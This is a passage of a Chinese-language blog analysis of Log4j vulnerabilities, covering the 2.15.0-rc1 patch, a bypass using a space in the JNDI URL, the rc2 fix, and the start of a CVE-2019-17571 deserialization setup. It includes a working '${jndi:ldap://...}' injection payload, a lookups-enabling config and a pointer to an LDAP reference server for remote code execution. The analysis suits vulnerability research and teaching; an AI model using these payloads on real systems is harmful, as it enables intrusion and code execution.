+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> JndiManager <span class="title function_">createManager</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> Properties data)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">hosts</span> <span class="operator">=</span> data != <span class="literal">null</span> ? data.getProperty(<span class="string">&quot;allowedLdapHosts&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">classes</span> <span class="operator">=</span> data != <span class="literal">null</span> ? data.getProperty(<span class="string">&quot;allowedLdapClasses&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">protocols</span> <span class="operator">=</span> data != <span class="literal">null</span> ? data.getProperty(<span class="string">&quot;allowedJndiProtocols&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">    List&lt;String&gt; allowedHosts = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    List&lt;String&gt; allowedClasses = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    List&lt;String&gt; allowedProtocols = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="comment">// 这里就是加入的白名单操作</span></span><br><span class="line">    <span class="built_in">this</span>.addAll(hosts, allowedHosts, JndiManager.permanentAllowedHosts, <span class="string">&quot;allowedLdapHosts&quot;</span>, data);</span><br><span class="line">    <span class="built_in">this</span>.addAll(classes, allowedClasses, JndiManager.permanentAllowedClasses, <span class="string">&quot;allowedLdapClasses&quot;</span>, data);</span><br><span class="line">    <span class="built_in">this</span>.addAll(protocols, allowedProtocols, JndiManager.permanentAllowedProtocols, <span class="string">&quot;allowedJndiProtocols&quot;</span>, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个JndiManager，使用了InitialDirContext</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JndiManager</span>(name, <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(data), allowedHosts, allowedClasses, allowedProtocols);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var10) &#123;</span><br><span class="line">        JndiManager.LOGGER.error(<span class="string">&quot;Error creating JNDI InitialContext.&quot;</span>, var10);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>总结： JndiManager 实例是由JndiManagerFactory来创建的，并且不再使用 InitialContext，而是使用 InitialDirContext。另外，在lookup方法中还加入的白名单逻辑判断</strong></p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>针对以上两点改进，同样存在神奇的绕过方式<br><strong>对于第一点</strong>，可以开启lookups功能，让其使用LookupMessagePatternConverter进行处理，这里的lookups默认是不开启的，所以需要手动开启<br>开启方式参考：<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/configuration.html#enabling-message-pattern-lookups">https://logging.apache.org/log4j/2.x/manual/configuration.html#enabling-message-pattern-lookups</a></p>
+<p>log4j2配置文件如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;warn&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MyApp&quot;</span> <span class="attr">packages</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">console</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%msg&#123;lookups&#125;%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>对于第二点</strong>，在JndiManager类的lookup方法中，最后捕获URISyntaxException异常的catch块没有进行如何处理及返回，这样还是能够执行到代码的最后一行<br>因此，只要触发URISyntaxException异常，就可以绕过，触发漏洞。触发异常的方式是在URL中加入一个空格</p>
+<h2 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RC1Bypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(RC1Bypass.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:9999/ test&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并且构建一个LDAP reference服务，监听9999端口，具体代码参考marshalsec：<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p>
+<h2 id="函数调用栈-1"><a href="#函数调用栈-1" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">257</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">221</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1110</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1033</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replaceIn:<span class="number">890</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">186</span>, MessagePatternConverter$LookupMessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">343</span>, PatternLayout$NoFormatPatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">241</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">226</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">60</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">161</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">134</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">125</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">89</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">542</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">500</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">483</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">417</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">82</span>, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2205</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2159</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2142</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2017</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">10</span>, RC1Bypass (org.example)</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p><strong>第一</strong>：<br>首先在准备阶段，需要获取配置文件中的信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(RC1Bypass.class);</span><br></pre></td></tr></table></figure>
+
+<p>跳过中间步骤，来到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> MessagePatternConverter <span class="title function_">newInstance</span><span class="params">(<span class="keyword">final</span> Configuration config, <span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">    <span class="comment">// 判断是否开启lookups</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">lookups</span> <span class="operator">=</span> loadLookups(options);</span><br><span class="line">    String[] formats = withoutLookupOptions(options);</span><br><span class="line">    <span class="type">TextRenderer</span> <span class="variable">textRenderer</span> <span class="operator">=</span> loadMessageRenderer(formats);</span><br><span class="line">    <span class="type">MessagePatternConverter</span> <span class="variable">result</span> <span class="operator">=</span> formats != <span class="literal">null</span> &amp;&amp; formats.length != <span class="number">0</span> ? <span class="keyword">new</span> <span class="title class_">FormattedMessagePatternConverter</span>(formats) : MessagePatternConverter.SimpleMessagePatternConverter.INSTANCE;</span><br><span class="line">    <span class="comment">// 如果开启，就新建LookupMessagePatternConverter</span></span><br><span class="line">    <span class="keyword">if</span> (lookups &amp;&amp; config != <span class="literal">null</span>) &#123;</span><br><span class="line">        result = <span class="keyword">new</span> <span class="title class_">LookupMessagePatternConverter</span>((MessagePatternConverter)result, config);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (textRenderer != <span class="literal">null</span>) &#123;</span><br><span class="line">        result = <span class="keyword">new</span> <span class="title class_">RenderingPatternConverter</span>((MessagePatternConverter)result, textRenderer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (MessagePatternConverter)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在MessagePatternConverter类的loadLookups中判断是否开启lookups</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">loadLookups</span><span class="params">(<span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (options != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] var1 = options;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> options.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var2; ++var3) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">option</span> <span class="operator">=</span> var1[var3];</span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;lookups&quot;</span>.equalsIgnoreCase(option)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119201941.png"></p>
+<p>回到MessagePatternConverter实例化函数，由于lookups为true，所以构造LookupMessagePatternConverter<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203118.png"></p>
+<p>函数调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">loadLookups:<span class="number">53</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">newInstance:<span class="number">89</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">createConverter:<span class="number">590</span>, PatternParser (org.apache.logging.log4j.core.pattern)</span><br><span class="line">finalizeConverter:<span class="number">657</span>, PatternParser (org.apache.logging.log4j.core.pattern)</span><br><span class="line">parse:<span class="number">420</span>, PatternParser (org.apache.logging.log4j.core.pattern)</span><br><span class="line">parse:<span class="number">177</span>, PatternParser (org.apache.logging.log4j.core.pattern)</span><br><span class="line">build:<span class="number">474</span>, PatternLayout$SerializerBuilder (org.apache.logging.log4j.core.layout)</span><br><span class="line">&lt;init&gt;:<span class="number">140</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">&lt;init&gt;:<span class="number">61</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">build:<span class="number">770</span>, PatternLayout$Builder (org.apache.logging.log4j.core.layout)</span><br><span class="line">build:<span class="number">627</span>, PatternLayout$Builder (org.apache.logging.log4j.core.layout)</span><br><span class="line">build:<span class="number">122</span>, PluginBuilder (org.apache.logging.log4j.core.config.plugins.util)</span><br><span class="line">createPluginObject:<span class="number">1107</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">createConfiguration:<span class="number">1032</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">createConfiguration:<span class="number">1024</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">createConfiguration:<span class="number">1024</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">doConfigure:<span class="number">643</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">initialize:<span class="number">243</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">start:<span class="number">289</span>, AbstractConfiguration (org.apache.logging.log4j.core.config)</span><br><span class="line">setConfiguration:<span class="number">626</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">reconfigure:<span class="number">699</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">reconfigure:<span class="number">716</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">start:<span class="number">270</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">getContext:<span class="number">155</span>, Log4jContextFactory (org.apache.logging.log4j.core.impl)</span><br><span class="line">getContext:<span class="number">47</span>, Log4jContextFactory (org.apache.logging.log4j.core.impl)</span><br><span class="line">getContext:<span class="number">196</span>, LogManager (org.apache.logging.log4j)</span><br><span class="line">getLogger:<span class="number">599</span>, LogManager (org.apache.logging.log4j)</span><br><span class="line">&lt;clinit&gt;:<span class="number">7</span>, RC1Bypass (org.example)</span><br></pre></td></tr></table></figure>
+
+<p>观察这个函数调用能够得到如何解析配置文件的</p>
+<p><strong>第二</strong>：<br>接下来进入到测试代码的主函数中，还是回到第一个关键点toSerializable方法，此时的convert是计划中的LookupMessagePatternConverter<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203348.png"></p>
+<p>进入LookupMessagePatternConverter的format方法，这里会寻找”${“，并且进行替换操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> toAppendTo.length();</span><br><span class="line">        <span class="comment">// 格式化</span></span><br><span class="line">        <span class="built_in">this</span>.delegate.format(event, toAppendTo);</span><br><span class="line">        <span class="comment">// 寻找$&#123;</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">indexOfSubstitution</span> <span class="operator">=</span> toAppendTo.indexOf(<span class="string">&quot;$&#123;&quot;</span>, start);</span><br><span class="line">        <span class="keyword">if</span> (indexOfSubstitution &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            <span class="built_in">this</span>.config.getStrSubstitutor().replaceIn(event, toAppendTo, indexOfSubstitution, toAppendTo.length() - indexOfSubstitution);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203724.png"></p>
+<p><strong>第三</strong>：<br>跳过中间的步骤，来到JndiLookup的lookup方法处，获取JndiManager对象的操作前面已经讲了，接下来就是进入其lookup方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p>由于构造的URL中test前面存在空格，所以在解析下面代码中会报异常</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(name);</span><br></pre></td></tr></table></figure>
+
+<p>然后执行最后的lookup操作，lookup会自动去掉空格，从而导致RCE<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119204528.png"></p>
+<h1 id="log4j-2-15-0-rc2分析"><a href="#log4j-2-15-0-rc2分析" class="headerlink" title="log4j-2.15.0-rc2分析"></a>log4j-2.15.0-rc2分析</h1><p>github commit地址：<a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658</a></p>
+<p>该commit修补了rc1带来的缺陷，在URISyntaxException异常的空缺块上加了return处理，这样就不会是使程序执行至最后一行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119232748.png"></p>
+<h1 id="落幕"><a href="#落幕" class="headerlink" title="落幕"></a>落幕</h1><p>在2.15.0-rc2版本之后，还是出现过一些问题，如：<br>2.15.0-rc2版本包括之前的版本由于lookups功能能够导致DOS攻击(CVE-2021-45046)</p>
+<p>在2.15.1-rc1中，默认禁用jndi<br>在2.16.0中，完全移除了lookup功能，修改了MessagePatternConverter实例化中的逻辑，并且删除了LookupMessagePatternConverter这个内部类<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231120110302.png"></p>
+<h1 id="CVE-2019-17571"><a href="#CVE-2019-17571" class="headerlink" title="CVE-2019-17571"></a>CVE-2019-17571</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>1.2.4 &lt;&#x3D; Apache Log4j &lt;&#x3D; 1.2.17</p>
+<h2 id="SimpleSocketServer类"><a href="#SimpleSocketServer类" class="headerlink" title="SimpleSocketServer类"></a>SimpleSocketServer类</h2><p>org.apache.log4j.net.SimpleSocketServer：该类是一个简单的基于 Socket 的日志消息接收服务器，用于接收远程 log4j 客户端发送的日志消息并将其记录到日志文件中。它监听指定的端口，等待客户端连接，并接收客户端发送的日志事件。</p>
+<p>通过启动 SimpleSocketServer，可以在服务器上运行一个 log4j 服务器，接收来自远程客户端的日志消息。这对于集中式日志记录和日志集中化非常有用，特别是在分布式系统或基于网络的应用程序中。</p>
+<p>使用 SimpleSocketServer 时，可以配置它的日志记录器、日志格式、日志文件路径等。</p>
+<p>默认开启4560端口</p>
+<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>SimpleSocketServer.main会开启一个端口，接收客户端传输过来的数据并对其进行反序列化</p>
+<h2 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h2><p>log4j-1.2.17.jar jdk1.8_66<br>1.2.17下载地址：<a target="_blank" rel="noopener" href="https://archive.apache.org/dist/logging/log4j/">https://archive.apache.org/dist/logging/log4j/</a><br>或直接maven导入</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>加入commons-collections3.1</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.log4j.net.SimpleSocketServer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE201917571</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> 